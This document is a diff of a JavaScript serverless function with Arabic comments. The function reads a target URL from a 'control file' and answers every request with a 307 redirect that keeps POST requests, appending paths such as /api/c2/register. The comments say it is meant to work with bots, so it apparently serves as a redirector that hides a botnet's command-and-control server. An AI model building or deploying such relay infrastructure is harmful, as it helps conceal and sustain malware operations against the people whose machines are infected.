@@ -3,22 +3,26 @@ const path = require('path');
 
 exports.handler = async function(event, context) {
   try {
-    // 1. تحديد المسار الصحيح لملف التحكم الخاص بك
-    const filePath = path.join(__dirname, '..', '..', 'server_url.txt');
+    // 1. تحديد المسار الصحيح للملف (الآن في نفس المجلد)
+    const filePath = path.join(__dirname, 'server_url.txt'); 
     
-    // 2. قراءة محتوى الملف وتنظيفه من أي مسافات
-    const serverUrl = fs.readFileSync(filePath, 'utf8').trim();
+    // 2. قراءة محتوى الملف وتنظيفه
+    const targetUrl = fs.readFileSync(filePath, 'utf8').trim();
 
     // 3. التحقق من أن الملف ليس فارغاً
-    if (!serverUrl) {
+    if (!targetUrl) {
       throw new Error("ملف التحكم server_url.txt فارغ.");
     }
-    
-    // 4. تنفيذ إعادة التوجيه التي تعمل مع البوتات
+
+    // 4. بناء الرابط الكامل
+    // event.path سيحتوي على المسار المطلوب مثل /api/c2/register
+    const finalUrl = targetUrl + event.path;
+
+    // 5. تنفيذ إعادة التوجيه
     return {
-      statusCode: 307, // يحافظ على طلبات POST
+      statusCode: 307, // Temporary Redirect (يحافظ على نوع الطلب POST/GET)
       headers: {
-        "Location": serverUrl,
+        "Location": finalUrl,
       },
     };
 
